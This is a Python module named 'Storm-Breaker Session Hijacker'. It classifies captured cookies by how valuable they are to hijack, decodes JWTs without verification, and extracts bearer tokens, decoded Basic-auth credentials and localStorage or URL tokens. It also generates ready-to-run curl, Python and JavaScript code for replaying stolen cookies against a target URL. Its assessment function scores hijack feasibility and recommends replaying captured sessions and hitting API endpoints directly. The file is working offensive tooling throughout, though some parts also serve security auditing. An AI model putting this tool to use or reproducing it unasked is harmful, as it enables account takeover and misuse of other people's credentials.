"""
Storm-Breaker Session Hijacker Module
Cookie parsing, JWT analysis, session token extraction, OAuth token analysis,
cookie replay request building, and session validity assessment.
"""

import re
import json
import base64
import hashlib
import time
from datetime import datetime, timedelta
from urllib.parse import unquote


# ═══════════════════════════════════════════════════════════════════
# COOKIE PARSER & CLASSIFIER
# ═══════════════════════════════════════════════════════════════════

# Known authentication cookie names across platforms
_AUTH_COOKIE_PATTERNS = {
    'session_id': {
        'patterns': [
            r'^(PHPSESSID|JSESSIONID|ASP\.NET_SessionId|connect\.sid|session_id|_session_id|ci_session)$',
        ],
        'category': 'session',
        'risk': 'high',
        'description': 'Server-side session identifier',
    },
    'auth_token': {
        'patterns': [
            r'^(auth_token|access_token|bearer_token|api_token|token|_token|auth|authorization)$',
        ],
        'category': 'authentication',
        'risk': 'critical',
        'description': 'Authentication/API token',
    },
    'jwt': {
        'patterns': [
            r'^(jwt|id_token|access_token|refresh_token)$',
        ],
        'category': 'jwt',
        'risk': 'critical',
        'description': 'JSON Web Token',
    },
    'oauth': {
        'patterns': [
            r'^(oauth_token|oauth2_token|oauth_session|oauth_verifier)$',
        ],
        'category': 'oauth',
        'risk': 'critical',
        'description': 'OAuth authentication token',
    },
    'csrf': {
        'patterns': [
            r'^(csrf_token|_csrf|csrftoken|XSRF-TOKEN|_xsrf|anti_forgery)$',
        ],
        'category': 'csrf',
        'risk': 'medium',
        'description': 'Cross-site request forgery protection token',
    },
    'remember_me': {
        'patterns': [
            r'^(remember_me|remember_token|persistent_login|stay_signed_in|rememberme)$',
        ],
        'category': 'persistence',
        'risk': 'high',
        'description': 'Persistent login / remember me token',
    },
    'tracking': {
        'patterns': [
            r'^(_ga|_gid|_gat|_fbp|_fbc|__utm|_hjid|amplitude_id|mp_).*$',
        ],
        'category': 'tracking',
        'risk': 'low',
        'description': 'Analytics/tracking cookie',
    },
    'preference': {
        'patterns': [
            r'^(theme|locale|lang|currency|timezone|cookie_consent|gdpr).*$',
        ],
        'category': 'preference',
        'risk': 'none',
        'description': 'User preference cookie',
    },
}

# Platform-specific cookie names
_PLATFORM_COOKIES = {
    'wordpress': {
        'cookies': ['wordpress_logged_in_*', 'wordpress_sec_*', 'wp-settings-*'],
        'platform': 'WordPress',
        'icon': '📝',
    },
    'django': {
        'cookies': ['csrftoken', 'sessionid', 'django_language'],
        'platform': 'Django',
        'icon': '🐍',
    },
    'flask': {
        'cookies': ['session', 'remember_token'],
        'platform': 'Flask',
        'icon': '🧪',
    },
    'laravel': {
        'cookies': ['laravel_session', 'XSRF-TOKEN'],
        'platform': 'Laravel',
        'icon': '🔺',
    },
    'rails': {
        'cookies': ['_rails_session', '_session_id'],
        'platform': 'Ruby on Rails',
        'icon': '💎',
    },
    'dotnet': {
        'cookies': ['.AspNetCore.Session', '.AspNetCore.Identity.*', 'ASP.NET_SessionId'],
        'platform': 'ASP.NET',
        'icon': '🔷',
    },
    'nextjs': {
        'cookies': ['__next-auth.session-token', 'next-auth.csrf-token'],
        'platform': 'Next.js',
        'icon': '⬛',
    },
    'google': {
        'cookies': ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID', '1P_JAR'],
        'platform': 'Google Services',
        'icon': '🔵',
    },
    'microsoft': {
        'cookies': ['MUID', 'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid'],
        'platform': 'Microsoft Services',
        'icon': '🟦',
    },
}


def parse_cookies(cookie_string=None, cookie_list=None):
    """
    Parse and classify cookies from a raw cookie string or list.
    Returns categorized cookies with risk assessment.
    """
    cookies = []

    if cookie_string:
        # Parse "name=value; name2=value2" format
        for pair in cookie_string.split(';'):
            pair = pair.strip()
            if '=' in pair:
                name, value = pair.split('=', 1)
                cookies.append({'name': name.strip(), 'value': value.strip()})

    if cookie_list and isinstance(cookie_list, list):
        for item in cookie_list:
            if isinstance(item, dict) and 'name' in item:
                cookies.append(item)
            elif isinstance(item, str) and '=' in item:
                name, value = item.split('=', 1)
                cookies.append({'name': name.strip(), 'value': value.strip()})

    # Classify each cookie
    classified = []
    platform_hints = set()

    for cookie in cookies:
        name = cookie.get('name', '')
        value = cookie.get('value', '')
        info = _classify_cookie(name, value)

        # Check for platform hints
        for pkey, pinfo in _PLATFORM_COOKIES.items():
            for pattern in pinfo['cookies']:
                if '*' in pattern:
                    if name.startswith(pattern.replace('*', '')):
                        platform_hints.add(pinfo['platform'])
                elif name == pattern:
                    platform_hints.add(pinfo['platform'])

        classified.append({
            **cookie,
            **info,
            'value_length': len(value),
            'is_base64': _is_base64(value),
            'is_jwt': _is_jwt(value),
            'entropy': _calculate_entropy(value),
        })

    # Sort by risk (critical > high > medium > low > none)
    risk_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'none': 4, 'unknown': 5}
    classified.sort(key=lambda c: risk_order.get(c.get('risk', 'unknown'), 5))

    # Summary stats
    risk_counts = {}
    category_counts = {}
    for c in classified:
        r = c.get('risk', 'unknown')
        risk_counts[r] = risk_counts.get(r, 0) + 1
        cat = c.get('category', 'unknown')
        category_counts[cat] = category_counts.get(cat, 0) + 1

    return {
        'cookies': classified,
        'total': len(classified),
        'risk_summary': risk_counts,
        'category_summary': category_counts,
        'platform_hints': list(platform_hints),
        'high_value_count': sum(1 for c in classified if c.get('risk') in ('critical', 'high')),
        'analyzed_at': datetime.now().isoformat(),
    }


def _classify_cookie(name, value):
    """Classify a cookie by its name."""
    for category_key, info in _AUTH_COOKIE_PATTERNS.items():
        for pattern in info['patterns']:
            if re.match(pattern, name, re.IGNORECASE):
                return {
                    'category': info['category'],
                    'risk': info['risk'],
                    'description': info['description'],
                    'matched_pattern': category_key,
                }
    return {
        'category': 'unknown',
        'risk': 'unknown',
        'description': 'Unrecognized cookie',
        'matched_pattern': None,
    }


def _is_base64(value):
    """Check if a string looks like base64 encoding."""
    if len(value) < 4:
        return False
    try:
        # Must be valid base64 and have reasonable length
        decoded = base64.b64decode(value + '==', validate=False)
        return len(value) > 10 and bool(re.match(r'^[A-Za-z0-9+/=_-]+$', value))
    except Exception:
        return False


def _is_jwt(value):
    """Check if a value looks like a JWT."""
    parts = value.split('.')
    if len(parts) != 3:
        return False
    try:
        # First two parts must be valid base64url
        for part in parts[:2]:
            padded = part + '=' * (4 - len(part) % 4)
            base64.urlsafe_b64decode(padded)
        return True
    except Exception:
        return False


def _calculate_entropy(text):
    """Calculate Shannon entropy of a string (bits per character)."""
    if not text:
        return 0.0
    freq = {}
    for c in text:
        freq[c] = freq.get(c, 0) + 1
    length = len(text)
    import math
    entropy = -sum((count / length) * math.log2(count / length) for count in freq.values())
    return round(entropy, 3)


# ═══════════════════════════════════════════════════════════════════
# JWT ANALYZER
# ═══════════════════════════════════════════════════════════════════

# JWT algorithm vulnerability database
_JWT_ALGORITHM_INFO = {
    'none': {'secure': False, 'vulnerability': 'CVE-2015-9235: Algorithm None attack', 'severity': 'critical'},
    'HS256': {'secure': True, 'vulnerability': None, 'severity': None, 'note': 'Symmetric — key compromise = full access'},
    'HS384': {'secure': True, 'vulnerability': None, 'severity': None, 'note': 'Symmetric — stronger than HS256'},
    'HS512': {'secure': True, 'vulnerability': None, 'severity': None, 'note': 'Symmetric — strongest HMAC variant'},
    'RS256': {'secure': True, 'vulnerability': None, 'severity': None, 'note': 'Asymmetric RSA — recommended for distributed systems'},
    'RS384': {'secure': True, 'vulnerability': None, 'severity': None},
    'RS512': {'secure': True, 'vulnerability': None, 'severity': None},
    'ES256': {'secure': True, 'vulnerability': None, 'severity': None, 'note': 'ECDSA — compact signatures'},
    'ES384': {'secure': True, 'vulnerability': None, 'severity': None},
    'ES512': {'secure': True, 'vulnerability': None, 'severity': None},
    'PS256': {'secure': True, 'vulnerability': None, 'severity': None, 'note': 'RSA-PSS — stronger than RS256'},
}


def analyze_jwt(token):
    """
    Decode and analyze a JWT token without verification.
    Extracts header, payload, checks expiry, identifies vulnerabilities.
    """
    result = {
        'is_valid_jwt': False,
        'raw_token': token[:50] + '...' if len(token) > 50 else token,
        'token_length': len(token),
        'header': None,
        'payload': None,
        'signature_present': False,
        'algorithm': None,
        'algorithm_info': None,
        'expiry': None,
        'is_expired': None,
        'issued_at': None,
        'claims': [],
        'vulnerabilities': [],
        'hijack_value': 'unknown',
        'analyzed_at': datetime.now().isoformat(),
    }

    parts = token.split('.')
    if len(parts) != 3:
        result['error'] = f'Invalid JWT structure: expected 3 parts, got {len(parts)}'
        return result

    # Decode header
    try:
        header_json = _base64url_decode(parts[0])
        result['header'] = json.loads(header_json)
        result['algorithm'] = result['header'].get('alg', 'unknown')
    except Exception as e:
        result['error'] = f'Header decode error: {str(e)}'
        return result

    # Decode payload
    try:
        payload_json = _base64url_decode(parts[1])
        result['payload'] = json.loads(payload_json)
    except Exception as e:
        result['error'] = f'Payload decode error: {str(e)}'
        return result

    result['is_valid_jwt'] = True
    result['signature_present'] = len(parts[2]) > 0

    # Algorithm analysis
    alg = result['algorithm']
    if alg in _JWT_ALGORITHM_INFO:
        result['algorithm_info'] = _JWT_ALGORITHM_INFO[alg]
        if not _JWT_ALGORITHM_INFO[alg]['secure']:
            result['vulnerabilities'].append({
                'type': 'algorithm',
                'severity': _JWT_ALGORITHM_INFO[alg]['severity'],
                'description': _JWT_ALGORITHM_INFO[alg]['vulnerability'],
            })

    # Check for algorithm confusion attacks
    if alg and alg.startswith('HS') and result['header'].get('typ') == 'JWT':
        result['vulnerabilities'].append({
            'type': 'potential_confusion',
            'severity': 'medium',
            'description': 'HMAC algorithm — check for RS→HS confusion vulnerability',
        })

    # Analyze claims
    payload = result['payload']
    standard_claims = {
        'iss': 'Issuer',
        'sub': 'Subject',
        'aud': 'Audience',
        'exp': 'Expiration',
        'nbf': 'Not Before',
        'iat': 'Issued At',
        'jti': 'JWT ID',
    }

    for claim_key, claim_name in standard_claims.items():
        if claim_key in payload:
            value = payload[claim_key]
            # Convert timestamps
            if claim_key in ('exp', 'nbf', 'iat') and isinstance(value, (int, float)):
                try:
                    dt = datetime.fromtimestamp(value)
                    result['claims'].append({
                        'key': claim_key,
                        'name': claim_name,
                        'value': value,
                        'human_readable': dt.isoformat(),
                    })
                    if claim_key == 'exp':
                        result['expiry'] = dt.isoformat()
                        result['is_expired'] = dt < datetime.now()
                        if result['is_expired']:
                            result['expired_ago'] = str(datetime.now() - dt)
                        else:
                            result['expires_in'] = str(dt - datetime.now())
                    elif claim_key == 'iat':
                        result['issued_at'] = dt.isoformat()
                except Exception:
                    result['claims'].append({'key': claim_key, 'name': claim_name, 'value': value})
            else:
                result['claims'].append({'key': claim_key, 'name': claim_name, 'value': value})

    # Custom claims
    for key, value in payload.items():
        if key not in standard_claims:
            result['claims'].append({
                'key': key,
                'name': f'Custom: {key}',
                'value': value if not isinstance(value, (dict, list)) else json.dumps(value)[:100],
            })

    # Check for sensitive data in payload
    sensitive_keys = ['password', 'secret', 'key', 'token', 'credit_card', 'ssn', 'phone']
    for key in payload:
        if any(s in key.lower() for s in sensitive_keys):
            result['vulnerabilities'].append({
                'type': 'sensitive_data',
                'severity': 'high',
                'description': f'Potentially sensitive data in claim: {key}',
            })

    # No expiry check
    if 'exp' not in payload:
        result['vulnerabilities'].append({
            'type': 'no_expiry',
            'severity': 'medium',
            'description': 'Token has no expiration claim — never expires',
        })

    # Hijack value assessment
    if result['is_expired']:
        result['hijack_value'] = 'low'
    elif any(v['severity'] == 'critical' for v in result['vulnerabilities']):
        result['hijack_value'] = 'critical'
    elif 'sub' in payload or 'user' in str(payload).lower():
        result['hijack_value'] = 'high'
    else:
        result['hijack_value'] = 'medium'

    return result


def _base64url_decode(data):
    """Decode base64url-encoded data."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data).decode('utf-8')


# ═══════════════════════════════════════════════════════════════════
# SESSION TOKEN EXTRACTOR
# ═══════════════════════════════════════════════════════════════════

def extract_tokens(data_sources):
    """
    Extract all session tokens, auth tokens, and JWTs from various data sources.
    data_sources: dict with keys like 'cookies', 'headers', 'body', 'local_storage', 'url'
    """
    tokens = []

    # From cookies
    if 'cookies' in data_sources:
        cookie_result = parse_cookies(
            cookie_string=data_sources['cookies'] if isinstance(data_sources['cookies'], str) else None,
            cookie_list=data_sources['cookies'] if isinstance(data_sources['cookies'], list) else None,
        )
        for cookie in cookie_result.get('cookies', []):
            if cookie.get('risk') in ('critical', 'high'):
                token_entry = {
                    'source': 'cookie',
                    'name': cookie['name'],
                    'value': cookie['value'],
                    'category': cookie['category'],
                    'risk': cookie['risk'],
                }
                # If it's a JWT, analyze it
                if cookie.get('is_jwt'):
                    token_entry['jwt_analysis'] = analyze_jwt(cookie['value'])
                tokens.append(token_entry)

    # From Authorization header
    if 'headers' in data_sources and isinstance(data_sources['headers'], dict):
        auth_header = data_sources['headers'].get('Authorization', '') or data_sources['headers'].get('authorization', '')
        if auth_header:
            if auth_header.startswith('Bearer '):
                bearer_token = auth_header[7:]
                entry = {
                    'source': 'header',
                    'name': 'Authorization (Bearer)',
                    'value': bearer_token,
                    'category': 'bearer_token',
                    'risk': 'critical',
                }
                if _is_jwt(bearer_token):
                    entry['jwt_analysis'] = analyze_jwt(bearer_token)
                tokens.append(entry)
            elif auth_header.startswith('Basic '):
                try:
                    decoded = base64.b64decode(auth_header[6:]).decode()
                    tokens.append({
                        'source': 'header',
                        'name': 'Authorization (Basic)',
                        'value': decoded,
                        'category': 'basic_auth',
                        'risk': 'critical',
                        'decoded_credentials': decoded,
                    })
                except Exception:
                    pass

    # From localStorage
    if 'local_storage' in data_sources and isinstance(data_sources['local_storage'], dict):
        token_keys = ['token', 'auth', 'jwt', 'access_token', 'refresh_token', 'id_token', 'session']
        for key, value in data_sources['local_storage'].items():
            if any(tk in key.lower() for tk in token_keys):
                entry = {
                    'source': 'localStorage',
                    'name': key,
                    'value': str(value)[:500],
                    'category': 'stored_token',
                    'risk': 'high',
                }
                if isinstance(value, str) and _is_jwt(value):
                    entry['jwt_analysis'] = analyze_jwt(value)
                tokens.append(entry)

    # From URL query parameters
    if 'url' in data_sources and isinstance(data_sources['url'], str):
        url = data_sources['url']
        if '?' in url:
            query = url.split('?', 1)[1]
            for param in query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    value = unquote(value)
                    if any(tk in key.lower() for tk in ['token', 'auth', 'key', 'session', 'code']):
                        tokens.append({
                            'source': 'url_parameter',
                            'name': key,
                            'value': value,
                            'category': 'url_token',
                            'risk': 'high',
                            'note': 'Token exposed in URL — high leakage risk',
                        })

    return {
        'tokens': tokens,
        'total': len(tokens),
        'critical_count': sum(1 for t in tokens if t.get('risk') == 'critical'),
        'high_count': sum(1 for t in tokens if t.get('risk') == 'high'),
        'jwt_count': sum(1 for t in tokens if 'jwt_analysis' in t),
        'analyzed_at': datetime.now().isoformat(),
    }


# ═══════════════════════════════════════════════════════════════════
# COOKIE REPLAY REQUEST BUILDER
# ═══════════════════════════════════════════════════════════════════

def build_replay_request(cookies, target_url, method='GET', additional_headers=None):
    """
    Build HTTP request configurations for cookie replay attacks.
    Generates curl, Python requests, and JavaScript fetch code.
    """
    # Build cookie string
    if isinstance(cookies, list):
        cookie_str = '; '.join(f'{c["name"]}={c["value"]}' for c in cookies if 'name' in c and 'value' in c)
    elif isinstance(cookies, str):
        cookie_str = cookies
    else:
        cookie_str = ''

    headers = {
        'Cookie': cookie_str,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    if additional_headers:
        headers.update(additional_headers)

    # Generate curl command
    curl_parts = [f'curl -X {method}']
    for k, v in headers.items():
        curl_parts.append(f"  -H '{k}: {v}'")
    curl_parts.append(f"  '{target_url}'")
    curl_cmd = ' \\\n'.join(curl_parts)

    # Generate Python requests code
    python_code = f'''import requests

url = "{target_url}"
cookies = {{
{_indent_dict(cookies, "    ")}
}}
headers = {{
{_indent_headers(headers, "    ")}
}}

response = requests.{method.lower()}(url, cookies=cookies, headers=headers)
print(f"Status: {{response.status_code}}")
print(f"Body: {{response.text[:500]}}")'''

    # Generate JavaScript fetch code
    js_code = f'''fetch("{target_url}", {{
  method: "{method}",
  headers: {{
{_indent_headers(headers, "    ")},
  }},
  credentials: "include"
}})
.then(r => r.text())
.then(body => console.log(body))
.catch(err => console.error(err));'''

    return {
        'target_url': target_url,
        'method': method,
        'cookie_count': len(cookies) if isinstance(cookies, list) else cookie_str.count('='),
        'replay_code': {
            'curl': curl_cmd,
            'python': python_code,
            'javascript': js_code,
        },
        'headers': headers,
        'generated_at': datetime.now().isoformat(),
    }


def _indent_dict(cookies, indent):
    """Format cookie dict for Python code."""
    if isinstance(cookies, list):
        lines = []
        for c in cookies:
            if 'name' in c and 'value' in c:
                lines.append(f'{indent}"{c["name"]}": "{c["value"]}",')
        return '\n'.join(lines)
    return f'{indent}# raw cookie string\n{indent}"cookie": "{cookies}"'


def _indent_headers(headers, indent):
    """Format headers dict for code generation."""
    lines = []
    for k, v in headers.items():
        if k != 'Cookie':
            lines.append(f'{indent}"{k}": "{v}",')
    return '\n'.join(lines)


# ═══════════════════════════════════════════════════════════════════
# SESSION ASSESSMENT
# ═══════════════════════════════════════════════════════════════════

def assess_session(cookie_data, jwt_tokens=None):
    """
    Assess the overall hijack-ability of a captured session.
    Returns risk assessment, recommended actions, and attack vectors.
    """
    assessment = {
        'session_strength': 'unknown',
        'hijack_feasibility': 'unknown',
        'risk_score': 0,
        'attack_vectors': [],
        'recommendations': [],
        'token_inventory': {
            'session_cookies': 0,
            'auth_tokens': 0,
            'jwt_tokens': 0,
            'csrf_tokens': 0,
            'total': 0,
        },
        'assessed_at': datetime.now().isoformat(),
    }

    cookies = cookie_data if isinstance(cookie_data, list) else cookie_data.get('cookies', [])

    for cookie in cookies:
        cat = cookie.get('category', '')
        risk = cookie.get('risk', '')

        if cat == 'session':
            assessment['token_inventory']['session_cookies'] += 1
        elif cat in ('authentication', 'bearer_token'):
            assessment['token_inventory']['auth_tokens'] += 1
        elif cat == 'jwt':
            assessment['token_inventory']['jwt_tokens'] += 1
        elif cat == 'csrf':
            assessment['token_inventory']['csrf_tokens'] += 1
        assessment['token_inventory']['total'] += 1

        if risk == 'critical':
            assessment['risk_score'] += 30
        elif risk == 'high':
            assessment['risk_score'] += 20
        elif risk == 'medium':
            assessment['risk_score'] += 10

    # Check for CSRF protection
    if assessment['token_inventory']['csrf_tokens'] == 0 and assessment['token_inventory']['session_cookies'] > 0:
        assessment['attack_vectors'].append({
            'vector': 'CSRF',
            'severity': 'high',
            'description': 'No CSRF token found — session may be vulnerable to cross-site request forgery',
        })
        assessment['risk_score'] += 15

    # Check for session cookie without auth
    if assessment['token_inventory']['session_cookies'] > 0 and assessment['token_inventory']['auth_tokens'] == 0:
        assessment['attack_vectors'].append({
            'vector': 'Session Fixation',
            'severity': 'medium',
            'description': 'Session cookie without separate auth token — simpler replay attack',
        })

    # JWT analysis
    if jwt_tokens:
        for jwt in jwt_tokens:
            analysis = jwt if isinstance(jwt, dict) else analyze_jwt(jwt)
            if analysis.get('is_expired') is False:
                assessment['attack_vectors'].append({
                    'vector': 'JWT Replay',
                    'severity': 'critical',
                    'description': f'Active JWT token found — valid until {analysis.get("expiry", "unknown")}',
                })
                assessment['risk_score'] += 25
            for vuln in analysis.get('vulnerabilities', []):
                assessment['attack_vectors'].append({
                    'vector': f'JWT: {vuln["type"]}',
                    'severity': vuln['severity'],
                    'description': vuln['description'],
                })

    # Cookie replay viability
    if assessment['token_inventory']['total'] > 0:
        assessment['attack_vectors'].append({
            'vector': 'Cookie Replay',
            'severity': 'high',
            'description': f'{assessment["token_inventory"]["total"]} cookies available for replay attack',
        })

    # Recommendations
    if assessment['token_inventory']['csrf_tokens'] == 0:
        assessment['recommendations'].append('Target lacks CSRF protection — CSRF attacks are viable')
    if assessment['token_inventory']['jwt_tokens'] > 0:
        assessment['recommendations'].append('Analyze JWT tokens for algorithm confusion or sensitive data exposure')
    if assessment['token_inventory']['session_cookies'] > 0:
        assessment['recommendations'].append('Attempt session replay with captured cookies')
    if assessment['token_inventory']['auth_tokens'] > 0:
        assessment['recommendations'].append('Auth tokens found — try accessing API endpoints directly')

    # Final scoring
    assessment['risk_score'] = min(100, assessment['risk_score'])
    if assessment['risk_score'] >= 70:
        assessment['hijack_feasibility'] = 'very_high'
        assessment['session_strength'] = 'weak'
    elif assessment['risk_score'] >= 50:
        assessment['hijack_feasibility'] = 'high'
        assessment['session_strength'] = 'moderate'
    elif assessment['risk_score'] >= 30:
        assessment['hijack_feasibility'] = 'medium'
        assessment['session_strength'] = 'fair'
    else:
        assessment['hijack_feasibility'] = 'low'
        assessment['session_strength'] = 'strong'

    return assessment


def get_supported_features():
    """Return supported session hijacking features."""
    return {
        'cookie_parser': {
            'name': 'Cookie Parser & Classifier',
            'icon': '🍪',
            'description': 'Parse, classify, and risk-assess HTTP cookies',
        },
        'jwt_analyzer': {
            'name': 'JWT Analyzer',
            'icon': '🔑',
            'description': 'Decode JWTs, check expiry, identify vulnerabilities',
        },
        'token_extractor': {
            'name': 'Token Extractor',
            'icon': '🎯',
            'description': 'Extract auth tokens from cookies, headers, localStorage, URLs',
        },
        'replay_builder': {
            'name': 'Replay Request Builder',
            'icon': '🔄',
            'description': 'Generate curl/Python/JS code for cookie replay attacks',
        },
        'session_assessment': {
            'name': 'Session Assessment',
            'icon': '🛡️',
            'description': 'Evaluate overall session security and hijack feasibility',
        },
    }
